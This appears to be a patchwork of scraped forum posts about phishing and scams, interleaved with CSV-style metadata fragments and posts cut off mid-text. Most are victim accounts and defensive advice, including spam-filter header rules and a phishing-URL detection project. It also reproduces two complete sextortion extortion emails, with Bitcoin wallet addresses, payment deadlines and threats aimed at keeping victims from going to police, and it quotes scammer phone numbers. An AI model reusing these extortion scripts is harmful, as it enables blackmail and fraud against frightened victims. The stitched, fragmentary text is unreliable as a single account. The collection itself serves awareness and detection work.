I made a video showing how you satisfy yourself in the left half of the screen, and the right half shows the video you were watching at the time.

With one mouse click, I can send this video to all your emails and contacts on your social networks.
I can also make public all your e-mail correspondence and chat history on the messengers that you use.

If you don't want this to happen, transfer $1450 in Bitcoin equivalent to my Bitcoin address (if you do not know how to do this, just search ""buy bitcoin"" on Google).

I will give you 50 hours (more than 2 days) to pay. I will get a notice, when you open this email, and the timer will start.

..

*Hi there!*

*I regret to inform you about some sad news for you.*  
*Approximately a month or two ago I have succeeded to gain a total access to all your devices utilized for browsing internet.*  
*Moving forward, I have started observing your internet activities on continuous basis.*

*Go ahead and take a look at the sequence of events provided below for your reference:*  
*Initially I bought an exclusive access from hackers to a long list of email accounts (in today‚Äôs world, that is really a common thing, which can arranged via internet).*  
*Evidently, it wasn‚Äôt hard for me to proceed with logging in your email account (xxx).*

*Within the same week, I moved on with installing a Trojan virus in Operating Systems for all devices that you use to login to email.*  
*Frankly speaking, it wasn‚Äôt a challenging task for me at all (since you were kind enough to click some of the links in your inbox emails before).*  
*Yeah, geniuses are among us.*

*Because of this Trojan I am able to gain access to entire set of controllers in devices (e.g., your video camera, keyboard, microphone and others).*  
*As result, I effortlessly downloaded all data, as well as photos, web browsing history and other types of data to my servers.*  
*Moreover, I have access to all social networks accounts that you regularly use, including emails, including chat history, messengers, contacts list etc.*  
*My unique virus is incessantly refreshing its signatures (due to control by a driver), and hence remains undetected by any type of antiviruses.*

*Hence, I guess by now you can already see the reason why I always remained undetected until this very letter‚Ä¶*

*During the process of compilation of all the materials associated with you,*  
*I also noticed that you are a huge supporter and regular user of websites hosting nasty adult content.*  
*Turns out to be, you really love visiting porn websites, as well as watching exciting videos and enduring unforgettable pleasures.*  
*As a matter of fact, I was not able to withstand the temptation, but to record certain nasty solo action with you in main role,*  
*and later produced a few videos exposing your masturbation and cumming scenes.*

*If until now you don‚Äôt believe me, all I need is one-two mouse clicks to make all those videos with everyone you know,*  
*including your friends, colleagues, relatives and others.*  
*Moreover, I am able to upload all that video content online for everyone to see.*  
*I sincerely think, you certainly would not wish such incidents to take place, in view of the lustful things demonstrated in your commonly watched videos,*  
*(you absolutely know what I mean by that) it will cause a huge adversity for you.*

*There is still a solution to this matter, and here is what you need to do:*  
*You make a transaction of $1490 USD to my account (an equivalent in bitcoins, which recorded depending on the exchange rate at the date of funds transfer),*  
*hence upon receiving the transfer, I will immediately get rid of all those lustful videos without delay.*  
*After that we can make it look like there was nothing happening beforehand.*  
*Additionally, I can confirm that all the Trojan software is going to be disabled and erased from all devices that you use. You have nothing to worry about,*  
*because I keep my word at all times.*

*That is indeed a beneficial bargain that comes with a relatively reduced price,*  
*taking into consideration that your profile and traffic were under close monitoring during a long time frame.*  
*If you are still unclear regarding how to buy and perform transactions with bitcoins ‚Äì everything is available online.*

*Below is my bitcoin wallet for your further reference: 1GS1SRz3QBC1NUeuhu8EWkx37qQXanUxGG*

*All you have is 48 hours and the countdown begins once this email is opened (in other words 2 days).*

*The following list includes things you should remember and avoid doing:*  
*> There‚Äôs no point to try replying my email (since this email and return address were created inside your inbox).*  
*> There‚Äôs no point in calling police or any other types of security services either. Furthermore, don‚Äôt you dare sharing this info with any of your friends.*  
*If I discover that (taking into consideration my skills, it will be really simple, because I control all your systems and continuously monitor them) ‚Äì*  
*your nasty clip will be shared with public straight away.*  
*> There‚Äôs no point in looking for me too ‚Äì it won‚Äôt result in any success. Transactions with cryptocurrency are completely anonymous and untraceable.*  
*> There‚Äôs no point in reinstalling your OS on devices or trying to throw them away. That won‚Äôt solve the issue,*  
*since all clips with you as main character are already uploaded on remote servers.*

*Things that may be concerning you:*  
*> That funds transfer won‚Äôt be delivered to me.*  
*Breathe out, I can track down everything right away, so once funds transfer is finished,*  
*I will know for sure, since I interminably track down all activities done by you (my Trojan virus controls all processes remotely, just as TeamViewer).*  
*> That your videos will be distributed, even though you have completed money transfer to my wallet.*  
*Trust me, it is worthless for me to still bother you after money transfer is successful. Moreover, if that was ever part of my plan, I would do make it happen way earlier!*

*We are going to approach and deal with it in a clear manner!*

*In conclusion, I‚Äôd like to recommend one more thing‚Ä¶ after this you need to make certain you don‚Äôt get involved in similar kind of unpleasant events anymore!*  
*My recommendation ‚Äì ensure all your passwords are replaced with new ones on a regular basis.*

It all began in January 2021 when I found out my mother was scammed by an individual who was pretending to be the musician Andr√© Rieu for whom she divorced my father. The scam started with the excuse that this person wanted to send my mother a ring and a necklace but she had to pay for part of the present. The lies kept on going and the story kept on changing. Then he started saying he got sick and needed money for the operation, then for the hospital, a lawyer‚Ä¶ god knows what. My mother ended up losing around 150K Euros to this scam. She tried to cut the communication but since she didn‚Äôt change her telephone number despite me insisting on it, they kept on contacting her. 
After finding this out, she moved cities but I recently discovered she kept on talking with this person and sending money. 
Furthermore, despite my warnings she opened new Instagram accounts where more scammers made profit of her ignorance and nativity. To the date I have found three different main profiles and conversations with up to 5 different people who scammed her‚Ä¶
She was contacted by a guy who said to be a US military person who needed cash to go visit her and a guy with a terminally ill daughter who needed her help. 
To the date she‚Äôs lost 230K‚Ç¨
This December I went to visit her and found out about all of the above plus over 12 loans she got to keep on sending money‚Ä¶ I have even contacted a lawyer to try and save her from the debt‚Ä¶after 10very hard days together, I thought this was over, that she understood the wrongs she did.

I am currently desperate, not really knowing what to do. We‚Äôve been to the police station several times to leave a report. They said they would investigate but I do not have much hope left. 
Right now I cannot have my mum live with me because I live in a different country and even though she‚Äôs open for therapy, the first appointment would be by the end of February.

He informed my chap that a young lady (Demi Pike for what it‚Äôs worth) had accidentally transferred him ¬£5 and he would need to transfer ¬£5 back to her account. 

I was half listening to the conversations and my alarm bells were ringing and red flags were up! I got ‚Äòshushed‚Äô when I said it didn‚Äôt sound right AT ALL!

1686364802.0,Rules that work (for me) to keep phishing email out of the inbox,"I was getting lots of phishing email to my inbox that bypassed my Spam filter. It was driving me crazy. And it got even worse after I reported one to [spam.org](https://spam.org). They started doubling down (2-3x) on that email address (thankfully not my main one), from 50 to about 120+ every day.

Phishers (e.g., [printdus.com](https://printdus.com)) send from 'spoofed' (well-formed) fake email addresses. Even though the subject lines were clearly SPAM (misspellings, letters replaced by numbers, lots of icons, odd spacing, etc.), these landed in my inbox.

I've been to all the videos from the pundits saying don't bother with 'block sender'--because they will just change it (mostly True) and rules won't work (that says Maybe).

Large email providers (gmail, outlook, etc.) check to see if sender domains are real as part of a Spam check. For example, [""geeksquad@emailinfo.geeksquad.com](mailto:""geeksquad@emailinfo.geeksquad.com)"" fails because ""[emailinfo.geeksquad.com](https://emailinfo.geeksquad.com)"" is a fake domain name. The goal is to get you to click the link, not reply, so they don't use real email addresses that can lead back to them. It looks good to the user (even though it's an ad for toe fungus), but the authorization checks say it's *possibly* Spam.

Why they get past Spam filters is that it might only ""soft"" fail. Soft fails are when a DNS (domain name server) times out or the Domain Keys Identified Mail (dkim) or Sender Policy Framework (spf) isn't provided. If any of them outright fail, it ends up in Junk folder, but soft fails (in my experience) sometimes get by.

The rule I use checks for the following ""words"" in every received **email header**: ""DNS Timeout"", ""dkim=none"" or ""spf=none"" and send them to my Junk folder. So far, that's fixed it.

And if you want to stop wading through your Junk folder for non-phishing emails, create a second rule to *permanently delete* emails by adding these two phrases: ""dkim=fail"", ""compauth=fail"". It has to run manually, but when I do, all that is left in Junk is garden variety Spam, a few Nigerians offering me large sums of money and emails that were mistakenly classified as spam.

And if you are curious: dkim is Domain Keys Identified Mail \[check for forged senders\]. spf is Sender Policy Framework \[10 DNS fails\]. CompuAuth is Composite Authorization \[spoof check\]. No legitimate sender will fail any of these checks. Even Spam passes. This only gets rid of (most) phishers.",phishing,2473,396,100,1

Called the number in the email (888)- 397-5703 and the guy claimed to tell me how to cancel the transaction. (In hindsight it's clear he didn't ask the right identifying information a customer service rep would normally ask and stumbled a little over the info I was giving him about the charge, but they got me early in the morning (I bet intentionally?) and $6k was a lot so I wasn't thinking clearly.

Finally caught on that it was a horrible scam when they directed me to the ultraviewer website to ""fill out a cancelation form"". I assume they'd have me download remote access software and then steal all my logins? Pains me to say this (because I'm Indian) but it was an Indian guy on the phone. He sounded really compassionate and worried for me.

The email ""FROM"" address was [receipts@messaging.squareup.com](mailto:receipts@messaging.squareup.com) so pretty convincing.

Yeah right. I'll jump right the fuck on that.   I somehow doubt Jeff is dropping Benjamin's on everyone like mana from heaven.

At any rate I attempted to first attach then when that didn't work, tried to forward the email to Amazon spoofing as a heads up. I knew one could block forwarding but thought the attach might work. both were blocked.

Not because Amazon needs help but maybe they do something to protect someone who doesn't know better and cannot afford to have money or account stolen. At any rate do any of you guys know an end run around or a way to help me track this back to the shitheads who pull this crap over the holidays?

The e-mail was really short, just providing a 6-digit code, and asking to respond to the e-mail or call a number if I had any questions. It looked kind of sketchy, but it came from the e-mail blockfi@support.com so I thought it might be legit. 

I searched up BlockFi, and submitted a ticket with them, saying that someone may be trying to set up an account using my e-mail. The automated e-mail that ticket generated was from a completely different e-mail from the original one I received: support@blockfi.zendesk.com. So  that led me to the assumption that the original e-mail I got was some sort of scam, and that I would have been in trouble if I responded to the e-mail or called the number.

It said the first 200 people telling the correct number (on a picture next to him) get 5000‚Ç¨. 
Ya I know, should have been the first indicator...

So, I posted the number in the comments. Cause you know, it was the real singer!

After a while he posted a link in the comments, saying we have to click it to get the money. (I know!!!! Silly me!)

It said to put in the credit card details. No charge. (...). But hey, it was the real singer, why would it be scam?! (Yep...)

So I clicked on the link. Filled in my name and credit card details. (So so so dumb)

It said it didn‚Äôt work. I did it again. If I reflect it correctly, there appeared another site. Again: name and credit card details. I made an account. 

It said to confirm the charge of 1‚Ç¨ off my credit card. For verification... (aaaaaaahhhhhhhhh)

Yes, I did that as well. Got a verification code from my bank and typed it in. 

Then it said to sign up for a free 5 day trial on rollermedia.net

Did that as well...

Back on Facebook:

Singer posts in the group ‚ÄúShare in 10 groups to get your money‚Äù

THEN, and only THEN, I became suspicious. I clicked on his profile. And you guesses right. Fake. New account. Not official. S.C.A.M.

So, I logged into my bank and immediately blocked my credit card. 

I received and email from rollermedia, confirming my 5 day trial and then continuing with 55$ a month!

I logged in and deleted my account. I quite wondered that it worked. 

I took screenshots of everything. 

I feel so so so very silly!!! So many times I saw things like that and couldn‚Äôt believe that people really fall for it. And now I did it myself... my only excuse is stress, dehydration and lack of sleep. :-(

Oh gosh!!!!

Anyway:

Do you think I‚Äôm safe? Or can I be prosecuted? I mean, I signed Agree with terms and conditions. 

Is there anything else I could do? Could there be anything on my phone now? I didn‚Äôt download anything though. 

My card is blocked. As I wrote, I think there was another page and I can‚Äôt really recall if I signed up on two different things. 

IF I did, they can‚Äôt get money off my bank, because I blocked my card. But can they demand it from me because I signed up for something?

I'm an IT admin and had one of my clients send me a copy of this kind of phishing email and I'm wondering just where it may have come from. The contents are clearly a phishing scam:

""üñ®Ô∏èAttn: XXXXXXXXXXXX

**-You have an important¬†XXXXXXXXXXXX designated Document-**   


It was scanned and sent to you \[XXXXXXXXXXXX\] using a Xerox WorkCentre multifunction¬†device on Microsoft¬†Exchange Portal.   


For more XXXXXXXXXXXX-specific information as it relates to you, please visit XXXXXXXXXXXX

**Retrieve Document**""

I've X'd out any emails and links that look like they would belong to my client's domain, when they clearly don't. The ""please visit"" link is actually something like this: ""[crixerox-secondary.z15.web.core.windows.net](https://crixerox-secondary.z15.web.core.windows.net)"". It takes you to a fake Outlook Web App login page.

This is what gets me:

1. At this particular client's location we've never had a Xerox printer until a week ago. Prior to that it's been all Epson and we never had emails like this.
2. I installed the Xerox printer myself and I disabled the Xerox cloud service, all the ports and protocols, except for the very necessary to get printing working in that particular location. I also installed the drivers (.INF based, not the .exe installer) myself on the workstations.
3. In addition, the whole network is firewall completely, only allowing VPN connections from the outside with logging and all that. There's no way someone would have just scanned the network remotely.
4. I'm suspecting one of the computers might have some sort of spyware installed? I have no other theory for why specifically a ""Xerox"" phishing email arrived in my client's inbox. Ideas where to look?

Thank you!",phishing,1733,272,64,1

He addressed me by my first name, knew the last 4 digits of the card used in my order, and even knew the items in my order. 

I was wary of this being a scam call from the beginning but he was not asking for any (in my opinion at the time) sensitive info. He was not asking for my card number or my bank info or anything like that, he only said he needed to verify it was me who made the order. 

Once I said ""yes I made the order"" he said okay and the phone call was ended. I didn't see any harm in confirming I made the order but I know now it was a scam call so I have no idea what they gain from calling me and confirming that I made that order.

1576085719.0,PHISHING IS MOVING AWAY FROM INTERNET TO LETTERS +1-888-274-5552,"The number +1-888-274-5552 represents a new yet old front in fraudulent phishing in Canada. The scam artist physically prints fake letters similar to and imitating CIBC bank of Canada or any other bank.

The letter is physically dropped at a victim's residential address. The letter has a fake Canada Post stamp on it, that was printed by a laser printer and looks like the letter is genuine. But the letter is fake with logos for the bank. The letter says the victim's account is closed and provides the number +1-888-274-5552 to call.

When the victim calls, they pretend to verify account number by asking usual security questions that banks ask like DOB, SIN, and bank PIN code number etc.  Usually the Victim has already been identified as being a CIBC customer or a customer belonging to the bank they are targeting.

The targeted victim usually has a good credit rating and has banking products with CIBC or the targeted bank. If the Victim's name is 'John Smith', the would intentionally misspell the victim's name to  something like 'jones Smith'. This entices the victim to want to call and correct it, believing that there must be a genuine error resulted from a customer with a similar name to theirs. Inside the letter, at the letter head it will have the correct phone numbers for CIBC, but at the bottom of the letter it asks the Victim to call CIBC divestiture department not customer service department.

The letter also contains a self addressed envelope to CIBC's correct mailing address, but the self Addresses envelope has a fake printed electronic return stamp.  This make's it appear more genuine.  When the Victim calls the number, the fraud artist is looking to get the Victim's Banking PIN code.

Very often the SCAMMERS already have the Victim's Credit details, but what they need is the Victim's Banking PIN code. So when the victim calls, they often provide to the victim, partial information such as...your Credit card number is 666667788, please tell us the last 4 digits.

The Victim then thinks that indeed this is CIBC bank, because they already have ther banking Details. Then They will Hang up with the victim, Tell the Victim the usual bullshit like Thank you for banking with CIBC etc and ask the victim not to call the bank back but allow 5 Business to process whatever it is they claimed.

And they would call the Victim back.  So the victim will call their real Bank 5 days later, but the Fraud has already happened. If you receive such a letter call the police, drop it off at a police station, the scam artist may have been careless and still have left finger prints on it. Or drop it off to your CIBC branch or your bank.

Now, the thing is if they got my email adress (no password given  tho and no money was sent) they could have got the general info of my pre-paid card but that's all there is. I don't have a bank account, nor a credit card, just a pre-paid card of a public service (which has currently 1 buck and 30 cents, yeah, I'm not doing very well).

1660875064.0,Ally Bank Phishing / Email / Fraud?,"Hi everyone!  Hoping I can find some help -

I do NOT have an Ally account, have never had an Ally account and have not opened one.  Tonight I received an e-mail confirming a new account has been opened, another confirming a new Zelle contact was added to this account and a third confirming a $1400 check deposit was made.  The e-mail account listed as the Zelle contact is not my e-mail address.  My main e-mail is firstname.lastname at a popular mail service; the Zelle contact allegedly added includes my first name, a few numbers and is at another popular mail service that I have never used.

The e-mails look pretty legit, though I know e-mail addresses can be easily spoofed.  There are no errors or obvious indicators of phishing that I can see.  I opened a new browser tab to go to the Ally site (did not use a link from the email) to see if I could do a username/password recovery to access an account associated with my real e-mail address, but Ally wants you to call if you can't remember your username, and they require a social security number to reset a password.  And since I have no intention of giving out my social during this debacle if I can help it, I settled on forwarding the e-mail to their ""fraud"" group and calling them.

I am now 30 minutes into a 2 hour hold time, and am trying to figure out what I can do in the meantime to protect my real money in my actual bank accounts, as I'm concerned if the Zelle deposit bounces and payments are made against it that they'll try and withdraw from my other existing accounts or come after me.  I deactivated Zelle completely from one of my bank accounts; another bank has Zelle set up, but won't let me deactivate it online, so I pointed it to a savings account that only has $5 in it just in case.

Has anyone seen this before?  I tried searching online but didn't see anything about this kind of scam, all I really found about Ally scams are fake fraud alerts.

And is there anything else I should do to protect myself?  My credit reports are all frozen, so not super worried there, but I'm worried there's something I'm not thinking about.

1650166539.0,How best to deal with Phishing Scam Emails? (Info specific to my current issue in text below),"I 've used gmail for years and, for the most part, I have managed to keep spam mail to a dull roar, i.e. generally only mail from legitimate companies' mailing lists that I purposely or accidentally signed up for while shopping or whatever. However...

&#x200B;

Recently, and all of a sudden, I began to get a handful of definite scam emails a day. It should be mentioned that I am generally quite careful about subscriptions, where I go online, etc, and I cannot think of anything I may hav done for several months to cause this sudden flood of scam. phish mail. 

Generally the emails come in the form of some kind of advertisement from a legitimate company, but from an obviously shady address, with maybe an image of some kind of deal, followed by ridiculous amounts of random information, bits of other emails to other people, bits of weird things like business newsletters, legal and technical jargon from who knows where about who knows what, broken up by what looks sometimes like html code.

&#x200B;

The latest one I got was an Easter ad image from Costco (from [info\_iCF5sQvYxe@hastjyelkmydbga.m.gbhem](mailto:info_iCF5sQvYxe@hastjyelkmydbga.m.gbhem.org).org and CC'd to several other's, like [1.2.3.4.jjga@aol.com](mailto:1.2.3.4.jjga@aol.com)), followed by a stream of hundreds of lines of random shit like broken info about differentN.  American university newsletters from department heads, then a bunch of bs in French, and then hundreds of sets of numbers and letters, all in the same form.

&#x200B;

My questions are these: is there a way to combat these within gmail, like marking each one as spam, or junk or what? With newsletter emails from obviously legit companies, I would simply unsubscribe, but from these scam emails, the Unsubscribe option always brings me to a suspicious webpage and asks I enter. my email address, which of course I do not do.

And also, does anyone have any idea what I might have done to have started this barrage of bullshit? I do not recall irresponsibly giving my email address out in any way whatsoever that I can think of, to legit sources or not, none at all, for many months.I haven't signed up for anything lately, online or at a store, I haven't subscribed to any weird websites, etc. So what gives?

1644824663.0,Discord Moderator Academy Phishing scam,"Long personal rant, sorry, but I am very anxious rn

There is a new scam going around with bots/frauds claiming to be discord staff and sending you ‚Äúdiscord moderator exam‚Äù links. I was very tired and stupid at the time and I fell for it, filling out my discord login information in a login page that redirected me to the official discord moderator exam website.

I was suspicious at first when the login verification email sent me a different IP address and location and so I decided to check from my phone. It showed the same IP address. Now I was using a mobile data provider for both devices so I thought that it was related to where the mobile data was hosted and thought nothing of it.

I know this was very stupid of me but I verified the login and immediately after I verified it I got logged out from my discord account in all of my devices. I panicked and tried to reset the password (somehow the email was still the same) but I couldn‚Äôt because the hacker set up their own 2FA that I couldn‚Äôt bypass. At this point I assumed my account was gone for good so I wrote a support email to discord to delete my account.

Now I assume the account has none of my personal information. The email I used wasn‚Äôt a personal one, I don‚Äôt have my phone number linked to it, and I didn‚Äôt have any credit card information in it since I am still a kid (I had nitro but it was gifted to me by a friend and it was expiring in 4 days as of writing this). I also changed all my passwords on other websites/games just to make sure.

And I don‚Äôt know why but somehow the hacker bought discord boosts through my account. I don‚Äôt know where they charged it or how they were able to buy it but the badge is there on my profile (I was able to see my profile through a friend‚Äôs screenshot).

I am currently panicking and I am very scared. I don‚Äôt want my personal info (such as IP address, address, face, etc.) being leaked by whoever hacked my account. 

So yeah don‚Äôt fall for this.",phishing,1967,377,25,1
1642954820.0,I received a sextortion phishing email and its making me anxious (even though its probably fake),"I received this email back in late December but I didn't really open until a few days ago since I was cleaning out my inbox and spam folders (which was where I found it). After reading the email I was honestly quite anxious, despite the fact that both my mom and my boyfriend (who I showed this email to) reassured me that it was a scam and I should just ignore it. 

Although it's been four days without me hearing anything from my relatives and friends about some inappropriate videos of me plus the fact that I have seen a similar email on the internet, I still feel pretty anxious because of the last part of the email (shown in the second screenshot). 

Anyway, other than providing me reassurance and soothing my anxiety about this, please let me know if there are any places where I can report these types of emails! And let me know if you had similar experiences. (Also is it even possible to download Trojans/any sort of virus on the MacOS/iOS/the operating systems that Apple uses since these are my primary devices?)

Long shot here, but I'm willing to try anything. My cousin was recently scammed, and they were successful in getting the desired money. ***Here is all that I know:***

* Cousin used a Google web browser to search for the log in to Amazon (yes, they're old and didn't grow up with computers).
* They somehow found a spoofed webpage for Amazon, which had a URL of an IP Address which sourced back to a Cloud service (I have the IP address, which I can relay to people via DM).
* They received an error message when attempting to log in, which included a phone number (the number is still active, if you feel it would be helpful, please let me know and I'll provide it to you in a DM).
* They called the number, and the person who answered didn't give them any indication that they were an Amazon support agent. They called themself ""John."" John guided my cousin through downloading GoToAssist, where they screen shared with them, had them delete their CC info from an actual Amazon log in website, and then sign into their bank account via the computer.
* John then guided my cousin through sending a payment of $1,800 through Zelle (which is exactly how much they had in their bank account). My cousin sent two payments since Zelle only allows a max of $999 sent at one time. This payment was sent to two different email addresses (I have both and can also provide them via DM).
* Immediately upon getting the second payment, John hung up.

**What they did after realizing it was a scam:**

* Went to their bank. All of the online banking has been frozen, and their debit and credit cards have been reissued.
* They changed all of their passwords.
* They ran a virus scanner on their computer.
* The programs they were instructed to download were deleted.
* Filed a police report.
* Filed a report through the FBI.

**What I've done:**

* Spoken to reps at their bank, along with helping them file a fraud claim.
   * The bank states that they'll reach out in 10 business days. They have to wait on the recipient's bank's determination to see if my cousin will be given their money back, which my cousin's bank would not guarantee.
* Contacted Zelle. They told us to contact my cousin's bank.

I realize the likelihood of the money being recovered is slim to none because there's that clause that states you should only be sending money to people you know before you send it. I was wondering if anyone knew of any helpful advice for speaking to customer service reps at my cousin's bank (the cousin will be on the line with me while this takes place, so they'll give consent), and any information into contacting Zelle. Really, any helpful information will be great.

Few years back, we used to follow the below steps to investigate Phishing emails:-

1. Check the header of email to see sender id/domain info.

2. See if embedded links/attachments are malicious by scanning through various websites such as VirusTotal, McAfee, Symantec, Sucuri

3. Check URL category of embedded url at Bluecoat, Websence, McAfee etc. 

4. Check the reputation of IP address, if available in email body. 

If the email is malicious based on the above analysis then check how many such emails are delivered to other employees -  by searching the emails from same sender or emails with similar subject. Accordingly take actions- block sender/domain etc. I think at that time it was not possible for us to delete the emails that have already been delivered to users.

Normally I wouldn't think much of receiving something like this on my work email or an email I use to sign up for social media, but this is from a Yahoo account that I created a couple years back that was only used for a couple anonymous throwaway accounts here and there. I'm feeling uneasy now.

Has anyone been experiencing an increase in a particular type of phishing e-mail that links to old articles? Users in our environment have been getting e-mails that are very simple, they contain a link to a random article on some reputable site or at least semi-reputable. There is no specific URL trickery or anything like that. Are the phishers just trying to test if the inbox exists? The sender varies from gmail/Hotmail type email to professional e-mail accounts.

1583947114.0,"Phishing Attack? via standard mail, not email. Looking for help."," Hi,

This is a strange situation where I‚Äôve received a collections notice in the mail (not e-mail) claiming I owe a certain amount of money for past debts not being paid to what I can tell is a credit card I‚Äôve never owned.

The actual letter is riddled with so many unprofessional oddities, one big one being my first name spelled incorrectly. Also simple things like inconsistent text alignment. It has a number to call ‚Äúif I have questions about this *offer*‚Äù. Thought that was weird language to use. I‚Äôve googled the number and the search results return many reports of people claiming it‚Äôs a complete scam. I‚Äôve also googled the P.O. Box where I can mail the money to and it‚Äôs a random box not associated with any business in a family suburb in a city in my country that I don‚Äôt live anywhere near.

Although my nerves were calmed hearing other people have had a similar issue I decided to get a credit report from Equifax. I received the credit report from them and to my surprise this debt showed up on the report. The account had been opened in Feb 2019 and closed in Aug 2019. Non of this to my knowledge. I called Equifax and they claim that this hasn‚Äôt or won‚Äôt affect my credit score.

I‚Äôve had the same bank, credit cards and debts all with one bank since I was in college over 8 years ago. The day before my credit report came in, I received another duplicate letter claiming I owe the same amount form the same sender.

I‚Äôm not sure if this is the correct subreddit for a question like this, or if anyone can provide an insights, direction or guidance but I‚Äôd figured I‚Äôd try. Was my data bought, sold or stolen without my knowledge? 

I can provide more specific details if this will help with answers.

Got a call from ""Social Security Fraud Department"" and decided to have a little phun at their expense. I've been doing this for months now: picking up the call and going along, wasting their time.

This one was so silly too: tells me that story about my Social Security Account being locked and suspended and me having allegations of illegal activities and an arrest warrant etc... scary stuff, lol

So I give the guy on the line false info and he doesn't bat an eyelash that my name is Roger (pronounced like french ""roh-cher"") Ribbitt (""with two T's!"") and my last 4 SSN digits are of course 1321, etc etc... he got stuck at my false ZIP code because it didn't validate on his end I suppose.

10 seconds later he comes on again - did he think his voice changed? But I was now talking to ""senior fraud officer"". He prompts me if I know about these terrible allegations that are ruining my Social Security?

Why yes, of course I do, I know all about it! You see, I got a call from Police Department 2 weeks go already and am being sued for $3m in damages by the department of the Interior for violating their Trust Law Certification Process, lol

He was getting confused. This was clearly not a response he had a script for. ""You spoke to the Police Department""?

Here is the email I received this morning, either way I would happily murder these people and eat their organs.

Hello!

As you may have noticed, I sent you an email from your account.
This means that I have full access to your account: On moment of hack your account has password: 707debd1916263e43a26

You say: this is the old password!
Or: I will change my password at any time!

Yes! You're right! 
But the fact is that when you change the password, my trojan always saves a new one!

I've been watching you for a few months now.
The fact is that you were infected with malware through an adult site that you visited.

If you are not familiar with this, I will explain.
Trojan Virus gives me full access and control over a computer or other device.
This means that I can see everything on your screen, turn on the camera and microphone, but you do not know about it.

I also have access to all your contacts and all your correspondence.

Why your antivirus did not detect malware?
Answer: My malware uses the driver, I update its signatures every 4 hours so that your antivirus is silent.

I made a video showing how you satisfy yourself in the left half of the screen, and in the right half you see the video that you watched.
With one click of the mouse, I can send this video to all your emails and contacts on social networks. I can also post access to all your e-mail correspondence and messengers that you use.

If you want to prevent this, transfer the amount of $758 to my bitcoin address (if you do not know how to do this, write to Google: &#8220;Buy Bitcoin&#8221;).

My bitcoin address (BTC Wallet) is: 17zmnmqEUCesNz6UgXGbRk7fKnu8iq1q2J

After receiving the payment, I will delete the video and you will never hear me again.
I give you 48 hours to pay.
I have a notice reading this letter, and the timer will work when you see this letter.

Filing a complaint somewhere does not make sense because this email cannot be tracked like my bitcoin address.
I do not make any mistakes.

If I find that you have shared this message with someone else, the video will be immediately distributed.

1689929582.0,Beware of This Kind of Phishing Scam: Stay Safe Online!,"I wanted to share a recent phishing scam or social engineering attack that seems to be making the rounds. Let's break down its possible components and discuss how we can protect ourselves from falling victim to such schemes.

1. **Random subject lines and numbers:** Scammers are getting smarter and using random subject lines to avoid spam filters and catch our attention. Be careful when encountering unusual subject lines, especially if they contain random numbers or characters.
2. **Random content and mass emailing:** The email's content may appear to be gibberish or include random numbers, making it harder for spam filters to identify. Additionally, scammers often send these emails to numerous recipients, increasing the odds of finding unsuspecting victims.
3. **Suspicious Attachment:** One red flag to watch out for is an attachment file (calendar or html file). Scammers could attempt to trick you into downloading and opening a malicious file that could lead to severe consequences.

# This attack could involve phishing or malware distribution.

1. **Phishing:** If you click on a link within the attachment or reply to email, you might end up on a fake website that looks remarkably similar to legitimate service. The attacker's goal is to steal your login credentials or personal information.
2. **Malware distribution:** Opening the attachment file could activate malware that might compromise your device, steal sensitive data, or cause other harm.

# Tips for Protecting Yourself:

1. **Avoid clicking suspicious links and downloading attachments:** If you're unsure about the sender's legitimacy or the email. Legitimate organization won't ask you provide sensitive data through email.
2. **Guard your personal information:** Be cautious about sharing personal information, login credentials, or financial details via email. Legitimate organization won't ask you to provide sensitive data through email.
3. **Report suspicious emails:** If you come across a suspicious email, consider reporting it to your email provider. Reporting such incidents helps others from failing into the same trap.
4. **Immediate deletion:** If you receive an email that raises suspicious, don't hesitate to delete it immediately. Move it to the trash permanently.

Phishing and malware attacks are becoming increasingly sophisticated, but with the right knowledge and caution, we can protect ourselves and from falling prey to these scams.

Let's keep each other safe online!!!

I clicked it, and I noticed the url was rather weird so I closed the fb app browser tab within a few seconds. The page was still loading (entire page was white) when I closed it. 

Going into that profile, i noticed more posts resembling the one I clicked and scrolling deep in the comments I saw people say that this profile had been hacked.

1650026275.0,How to Iidentify zero day phishing URLs,"So I'm doing my final yr project on phishing URL detection system using deep learning. For non-zero day phishing URLs it is easy to train model using NLP. but for zero day phishing URLs we don't have a clue about what URL will be. so what are the methods to identify only watching the URL. I'm not going to check the content of the web page. just the URL. 

for now I have been reading and gathering Information like going through domain details. if domain age is less than six months there is a possibility to be that URL is a phishing URL. like that what are the methods to identify zero day phishing URLs.

In my project I have included these things

1.white list to identify the famous legitimate URLs.

2. NLP base trained model to identify the phishing domain which we are already know

3. zero day phishing URL detection ( this is the topic where I need help )

1646712174.0,I've had my Instagram account phished and I'm having troubles getting it back,"I have no idea if this is the appropriate place to ask for this, but here we go. This is also posted to r/advice if anyone sees the double and has a bout of deja vu (unlikely). It's my first time posting anything this serious, so go easy on me.

Yesterday I received an odd request from a friend on Instagram: they had trouble logging on to their account and wanted to send a verification my way. Stupidly I didn't ask any questions or even think twice about it, and only realized something was wrong after it was done.

The message read as follows:

""I was trying to log in to my Instagram page on my new phone and it asks me to find someone to help give me a code, Instagram gave me suggestions from two friends and you are one of them, the other person is not online . Could you help me receive the code please?""

Afterwards I received a text message from Facebook, which I sent a screenshot of to what I thought was my friend. I didn't think anything of it until I saw a discussion in a group I'm in regarding a similar phishing attempt. I realized what happened then, but it was too late...

My password, email and phone number were all changed, and none of the alert emails I got from Meta did anything to mitigate the damage. I've gone through all the suggestions given to me when I hit the login button and submitted like 6 or so video selfies, but all have been rejected to date. For some reason none of the other support options work, and the new phone number is a nonexistent hodgepodge of numbers. My only solace is I was able to use my other social media to warn my friends so they don't get hit with the same issue.

There's nothing really valuable on my account, since it's just used for talking to friends and browsing, but I have 3 years worth of memes saved on it and some of those conversations aren't meant for strangers to see (nothing illegal/immoral, but definitely heart to heart stuff).

A lot of others online have reported that they also received the same email and that our information would be sent to the dark web if said institution did not reach out to them to negotiate something. I already emailed the application website and have not received a response. People were saying it is nothing to worry about only to not click the link while others said they clicked the link and they were screenshots of people's personal info and other institutions they were able to breach. Other people were saying it was real so I figured I would ask your thoughts.

What do you think their angle is? My first thoughts would be some sort of sim swap or man-in-the-middle type of attack. I'm having a really hard time believing they **just** want our cell numbers. I mean, if they really wanted them so bad, it wouldn't take an OSINT master to find them online. Plus, if the end goal is a phone call to continue the ruse, wouldn't they be busted the moment they spoke? They won't sound like the executive. They also couldn't write well in the email, with all the spell check and grammar tools freely available online, why would they speak any better over the phone?

I checked with zoom, and the meeting code given is a valid meeting.

I could imagine a couple of things going on here: 

1. The link doesn't actually go to a zoom meeting, It just has that to make people more likely to click on it. I doubt this is the case since the email wasn't about zoom to begin with.
